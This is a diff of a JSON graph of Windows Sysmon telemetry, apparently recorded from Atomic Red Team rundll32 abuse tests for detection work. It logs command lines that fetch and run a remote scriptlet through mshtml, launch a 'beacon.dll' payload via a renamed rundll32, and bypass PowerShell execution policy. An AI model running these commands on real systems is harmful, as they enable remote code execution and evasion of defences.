-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "cedf07c17b21a95023147e96e2fbfa3e5d0744af22e1af7b3e84727ef460e6eb",
-        "event_id": "1",
-        "id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
@@ -1920,6 +752,307 @@
       }
     },
     {
+      "id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{9014E149-04A8-5FC5-E100-000000009101}",
+        "pid": "4664",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe\" -noprofile -noninteractive -executionpolicy unrestricted <decoded_b64: &chcp.com 65001 > $null\n$exec_wrapper_str = $input | out-string\n$split_parts = $exec_wrapper_str.split(@(\"0000\"), 2, [stringsplitoptions]::removeemptyentries)\nif (-not $split_parts.length -eq 2) { throw \"invalid payload\" }\nset-variable -name json_raw -value $split_parts[1]\n$exec_wrapper = [scriptblock]::create($split_parts[0])\n&$exec_wrapper> <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "dca7397ba3159303f70ec38566f38e84714e2a13eb81f01c24fd6656b2cc2779",
+        "event_id": "1",
+        "id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{9014E149-04A8-5FC5-E000-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:10",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "rundll32.exe",
+        "guid": "{9014E149-04AA-5FC5-EB00-000000009101}",
+        "pid": "2776",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x100000 for rundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "167d1564d851cf9ca3561a5b25e6db3e3a8f3cfa7718f8ffba2fa3097ed2dcfd",
+        "parent_process_id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "Process:{834264DD-651A-6206-F300-000000002802}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{834264DD-651A-6206-F300-000000002802}",
+        "pid": "6564",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll,#2 <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
+        "command_hash": "bc135980fc2714dc6656d261c7693de1f7035833da124ae02c2839b67c87c478",
+        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{834264DD-651A-6206-F300-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Technique:T1218_011",
+      "label": "T1218.011",
+      "type": "technique",
+      "group": "Technique",
+      "properties": {
+        "id": "Technique:T1218_011",
+        "name": "T1218.011",
+        "display_name": "T1218.011",
+        "type": "Technique",
+        "entity_class": "Technique"
+      }
+    },
+    {
+      "id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{9014E149-04A9-5FC5-E500-000000009101}",
+        "pid": "1584",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe\" -noninteractive <decoded_b64: [console]::inputencoding = new-object text.utf8encoding $false; import-module \"c:\\atomicredteam\\invoke-atomicredteam\\invoke-atomicredteam.psd1\" -force\ninvoke-atomictest \"t1218.011\" -confirm:$false -timeoutseconds 300 -executionlogpath c:\\atomicredteam\\atc_execution.csv> <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "638dd9b7d6ba9cb46158fc27957958add3a89d454c153f82b970e525220f13a5",
+        "event_id": "1",
+        "id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{9014E149-04A8-5FC5-E100-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{D700CDCA-CFF8-6022-A4A3-00000000A301}",
+        "pid": "6696",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "%system32%\\rundll32.exe",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "0e04d438d4be6b7ed8d1c6be2d2467b595ee7dae3923d8112f3559f47eb166b6",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-C0D1-6022-C4A1-00000000A301}",
+        "pid": "1204",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe"
+      }
+    },
+    {
+      "id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{834264DD-651A-6206-F200-000000002802}",
+        "pid": "6520",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll,#2 & rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll #2 & rundll32.exe c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll, #2 <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "82d629aa62f4ecde0d6b9f9da2983602dbd5ecdca46631308a07ac7e52c50056",
+        "event_id": "1",
+        "id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{834264DD-64D6-6206-DA00-000000002802}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-BD16-6022-36A1-00000000A301}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{D700CDCA-BD16-6022-36A1-00000000A301}",
+        "pid": "2076",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{D700CDCA-BD16-6022-36A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{9014E149-0702-5FC5-D001-000000009101}",
+        "pid": "2868",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  advpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=C7645D43451C6D94D87F4D07BDE59C89,SHA256=495BBA47FC43EE23054FCD419F2F00457162D1C04296900C6AEA551102A810F3,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "b7079f540dc46a860c2fcc29dc3e78dca6f1201db9ee590d42959ab957f501fa",
+        "parent_process_id": "Process:{9014E149-0702-5FC5-CF01-000000009101}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{9014E149-0702-5FC5-D001-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{D700CDCA-C05C-6022-A3A1-00000000A301}",
+        "pid": "7992",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C05C-6022-A3A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{D700CDCA-8E14-6021-A97C-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{9014E149-0448-5FC5-1500-000000009101}",
+        "pid": "1312",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{9014E149-0448-5FC5-1500-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:10",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "rundll32.exe",
+        "guid": "{D700CDCA-CFF8-6022-A4A3-00000000A301}",
+        "pid": "6696",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1410 for rundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "ee5b2826e86f42a0f8e00fcb9490ec82d071f72d3527607080702f782d1edddf",
+        "parent_process_id": "Process:{D700CDCA-5543-6021-B175-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{D700CDCA-CFF8-6022-A4A3-00000000A301}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe"
+      }
+    },
+    {
       "id": "Process:{9014E149-05D6-5FC5-5C01-000000009101}:10",
       "label": "rundll32.exe",
       "type": "process",
@@ -1941,6 +1074,98 @@
         "entity_class": "ProcessEntity",
         "display_name": "rundll32.exe",
         "name": "rundll32.exe"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
+      "label": "csrss.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "client server runtime process",
+        "guid": "{9014E149-0446-5FC5-0500-000000009101}",
+        "pid": "640",
+        "image_path": "%system32%\\csrss.exe",
+        "command_line": "%%systemroot%%\\system32\\csrss.exe objectdirectory=\\windows sharedsection=1024,20480,768 windows=on subsystemtype=windows serverdll=basesrv,1 serverdll=winsrv:userserverdllinitialization,3 serverdll=sxssrv,4 profilecontrol=off maxrequestthreads=16",
+        "original_file_name": "csrss.exe",
+        "image_hash": "MD5=955E9227AA30A08B7465C109B863B886,SHA256=D896480BC8523FAD3AE152C81A2B572022C3778A34A6D85E089D150A68E9165E,IMPHASH=273BC9D936389D79244E6E56BE5096B6",
+        "command_hash": "319830b380c6be2431adbc10c58121192cdbf4e087d98b1ecebf350fdb98e572",
+        "event_id": "1",
+        "id": "Process:{9014E149-0446-5FC5-0500-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "csrss.exe",
+        "name": "csrss.exe",
+        "parent_process_id": "Process:{9014E149-0446-5FC5-0400-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "network:151.101.12.133:443:tcp",
+      "label": "151.101.12.133",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "151.101.12.133",
+        "destination_port": "443",
+        "protocol": "tcp",
+        "domain_name": "-",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "parent_process_id": "Process:{9014E149-04AA-5FC5-EB00-000000009101}:1",
+        "event_id": "3",
+        "id": "network:151.101.12.133:443:tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "151.101.12.133",
+        "name": "151.101.12.133"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D301-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-0703-5FC5-D301-000000009101}",
+        "pid": "1228",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe syssetup.dll,setupinfobjectinstallaction defaultinstall 128 .\\c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011_defaultinstall.inf <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "f02ef0b4eb47a7fd07950c51d45c2eced1934c873ac42a22c441bd1fabb62a48",
+        "event_id": "1",
+        "id": "Process:{9014E149-0703-5FC5-D301-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
+      "label": "notrundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{D700CDCA-C0EE-6022-CCA1-00000000A301}",
+        "pid": "7116",
+        "image_path": "c:\\temp\\notrundll32.exe",
+        "command_line": "c:\\temp\\notrundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "ee66fdf9fbd9ffe53e162f78d5781e5a4c496a1557b070b809f0792e37f98830",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notrundll32.exe",
+        "name": "notrundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-C0EE-6022-CBA1-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
       }
     },
     {
@@ -1968,16 +1193,943 @@
       }
     },
     {
-      "id": "Technique:T1218_011",
-      "label": "T1218.011",
-      "type": "technique",
-      "group": "Technique",
+      "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
       "properties": {
-        "id": "Technique:T1218_011",
-        "name": "T1218.011",
-        "display_name": "T1218.011",
-        "type": "Technique",
-        "entity_class": "Technique"
+        "process_name": "windows host process (rundll32)",
+        "guid": "{D700CDCA-C0E7-6022-CAA1-00000000A301}",
+        "pid": "6484",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "%system32%\\rundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "5ab9ecca5d68b30cc81b8eb9aec8420452b73ea6b0108f8c6a53fa8c356ed348",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0E7-6022-CAA1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-C0E7-6022-C9A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{834264DD-64E7-6206-E300-000000002802}:1",
+      "label": "windows host process (rundll32)",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{834264DD-64E7-6206-E300-000000002802}",
+        "pid": "5760",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll                                                                                                                                             #2blahblah",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
+        "command_hash": "cc29d6ccf69e1eed326bc77660aefe18c507866c42966f074854be56e62e6e80",
+        "parent_process_id": "Process:{834264DD-64E7-6206-E200-000000002802}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{834264DD-64E7-6206-E300-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows host process (rundll32)",
+        "name": "windows host process (rundll32)"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-0703-5FC5-D101-000000009101}",
+        "pid": "1388",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c \"rundll32.exe ieadvpack.dll,launchinfsection c:\\atomicredteam\\atomics\\t1218.011\\src\\t1218.011.inf,defaultinstall_singleuser,1, <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "ed3d49aafb4015a538b0d643ae8ead0c2ea5ff429a16a2f28f4a58dacaadc82b",
+        "event_id": "1",
+        "id": "Process:{9014E149-0703-5FC5-D101-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{D700CDCA-C0F4-6022-CDA1-00000000A301}",
+        "pid": "7556",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "%system32%\\rundll32.exe  c:\\payloads\\beacon.dll,dllregisterserver <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667,IMPHASH=7D1CE1BAFE48B63D9D19E8E0E5DF3E6C",
+        "command_hash": "5ab9ecca5d68b30cc81b8eb9aec8420452b73ea6b0108f8c6a53fa8c356ed348",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe",
+        "parent_process_id": "Process:{D700CDCA-C0D1-6022-C4A1-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows host process (rundll32)",
+        "guid": "{834264DD-651B-6206-F700-000000002802}",
+        "pid": "5512",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "rundll32.exe  c:\\atomicredteam\\atomics\\t1218.010\\bin\\allthethingsx64.dll, #2 <rundll32_abuse>",
+        "original_file_name": "rundll32.exe",
+        "image_hash": "MD5=23DB802097F7B7E520E40068A7E68B14,SHA256=28DE7D3E8BF4B19E44063A4BFC2E7C30AE488CD9A1F63320ED374E14AAECA667",
+        "command_hash": "e43c5ed6f0599c1fd1c4e2a8e97d9ca6aa234e5c2343d86f560bc882787d65b0",
+        "event_id": "1",
+        "id": "Process:{834264DD-651B-6206-F700-000000002802}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rundll32.exe",
+        "name": "rundll32.exe",
+        "parent_process_id": "Process:{834264DD-651A-6206-F200-000000002802}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{9014E149-04AA-5FC5-EA00-000000009101}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{9014E149-04AA-5FC5-EA00-000000009101}",
+        "pid": "4452",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\mshtml,runhtmlapplication \";document.write();getobject(\"script:https:\\raw.githubusercontent.com\\redcanaryco\\atomic-red-team\\master\\atomics\\t1218.011\\src\\t1218.011.sct\").exec(); <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "0755e90a2d6301113d5bdafd46616f4fe2f3330c5062e07434e89f2fe721f145",
+        "event_id": "1",
+        "id": "Process:{9014E149-04AA-5FC5-EA00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{9014E149-04A9-5FC5-E500-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:10",
+      "label": "notrundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "notrundll32.exe",
+        "guid": "{D700CDCA-C0EE-6022-CCA1-00000000A301}",
+        "pid": "7116",
+        "image_path": "c:\\temp\\notrundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1400 for notrundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "749090828e107d12749b37012b69f93512b743d1c61778ae1a27e75933b1a791",
+        "parent_process_id": "Process:{D700CDCA-944A-601D-1600-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "10",
+        "id": "Process:{D700CDCA-C0EE-6022-CCA1-00000000A301}:10",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "notrundll32.exe",
+        "name": "notrundll32.exe"
+      }
+    },
+    {
+      "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:18",
+      "label": "postex_456a",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "postex_456a",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-CF05-6022-85A3-00000000A301}:1",
+        "event_id": "18",
+        "id": "File:0861450d60e0d21141570f77a38dca8b722019e27bacbe1b8ffc0cf534fadb8c:18",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "postex_456a",
+        "name": "postex_456a"
+      }
+    },
+    {
+      "id": "Process:{D700CDCA-C082-6022-A7A1-00000000A301}:1",
+      "label": "windows command processor",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{D700CDCA-C082-6022-A7A1-00000000A301}",
+        "pid": "7952",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c c:\\temp\\notrundll32.exe c:\\payloads\\beacon.dll,start <rundll32_abuse>",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
+        "command_hash": "c295196469f7de13ca340abf3d5a5cd0515ec7f199303d4b612eedabac0fd90a",
+        "parent_process_id": "Process:{D700CDCA-9959-6021-267E-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{D700CDCA-C082-6022-A7A1-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows command processor",
+        "name": "windows command processor"
+      }
+    },
+    {
+      "id": "File:cbd2a4cac80cab93231e14a78340c819db76eae89b2a64bf2a100729bbf346e6:17",
+      "label": "msse-4488-server",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "msse-4488-server",
+        "source_image_path": "%system32%\\rundll32.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{D700CDCA-C0F4-6022-CDA1-00000000A301}:1",
+        "event_id": "17",
+        "id": "File:cbd2a4cac80cab93231e14a78340c819db76eae89b2a64bf2a100729bbf346e6:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "msse-4488-server",
+        "name": "msse-4488-server"
+      }
+    },
+    {
+      "id": "Process:{9014E149-0703-5FC5-D201-000000009101}:10",
+      "label": "rundll32.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "rundll32.exe",
+        "guid": "{9014E149-0703-5FC5-D201-000000009101}",
+        "pid": "2576",
+        "image_path": "%system32%\\rundll32.exe",
+        "command_line": "GrantedAccess with bitmask: 0x1000 for rundll32.exe",
+        "original_file_name": "",
+        "image_hash": "",
